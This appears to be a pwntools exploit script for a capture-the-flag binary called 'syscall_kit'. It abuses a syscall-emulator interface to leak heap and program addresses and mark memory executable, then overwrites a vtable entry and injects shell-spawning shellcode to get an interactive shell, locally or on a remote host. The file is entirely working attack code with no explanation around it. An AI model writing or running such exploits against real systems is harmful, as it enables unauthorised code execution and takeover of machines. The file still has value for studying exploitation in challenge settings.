from pwn import *
context(os="linux", arch="amd64", kernel="amd64")

context.log_level="debug"  

g_fname = args.FNAME if args.FNAME else './syscall_kit' 

if (args.REMOTE):
    host, port = args.REMOTE.split(':')
    g_io = remote(host, int(port))
else:
    g_io = process(g_fname)

def exec_syscall_noret(sysno, arg1, arg2, arg3):
    g_io.sendlineafter(b"syscall:", str(sysno).encode())
    g_io.sendlineafter(b"arg1:", str(arg1).encode())
    g_io.sendlineafter(b"arg2:", str(arg2).encode())
    g_io.sendlineafter(b"arg3:", str(arg3).encode())

def exec_syscall(sysno, arg1, arg2, arg3):
    exec_syscall_noret(sysno, arg1, arg2, arg3)
    g_io.recvuntil(b"retval: ")
    retval = int(g_io.recvline()[:-1], 16)
    return retval

def pwn():
    # brk(0) leak heap
    heap_base = exec_syscall(int(constants.SYS_brk), 0, 0, 0) - 0x21000
    log.success('heap@%#x' % heap_base)
    addr_vtbl_ptr = heap_base + 0x11e70

    # mprotect(heap_base, 0x21000, 7)
    exec_syscall(int(constants.SYS_mprotect), heap_base, 0x21000, 7)

    # writev to leak Emulator's function in it's vtable.
    exec_syscall_noret(int(constants.SYS_writev), 1, addr_vtbl_ptr, 1)
    g_io.recvuntil(b"=========================\n")
    addr_vfn1 = u64(g_io.recv(8))
    addr_check = u64(g_io.recv(8))
    log.success("Emulator::check@%#x" % addr_check)
    proc_base = addr_check - 0x116E
    log.success("The program@%#x" % proc_base)
    addr_vtbl = proc_base + 0x202ce0
    log.success("Emulator's vtable@%#x" % addr_vtbl)

    # mprotect again, to make all segments of the program RWX
    exec_syscall(int(constants.SYS_mprotect), proc_base+0x202000, 0x1000, 7)

    # replace the check with our fake check, which always return 0
    overwrite_vtbl = flat([addr_vfn1, addr_vtbl_ptr+0x20])
    exec_syscall_noret(int(constants.SYS_readv), 0, addr_vtbl_ptr, 1)
    g_io.send(overwrite_vtbl)

    # len(sc_fake_check) == 4
    # sc_fake_check = asm("xor rax, rax; ret")
    sc_fake_check = 0xc3c03148
    exec_syscall_noret(int(constants.SYS_read), 0, heap_base+0x11000, sc_fake_check)
    g_io.send(asm(shellcraft.sh()))

    # getshell via call 'check' again.
    exec_syscall_noret(int(constants.SYS_read), 0, addr_vtbl+8, sc_fake_check)
    g_io.send(p64(heap_base+0x11000))

    exec_syscall_noret(0, 0, 0, heap_base+0x11000)
    # g_io.sendline()

if ('__main__' == __name__):
    pwn()
    g_io.interactive()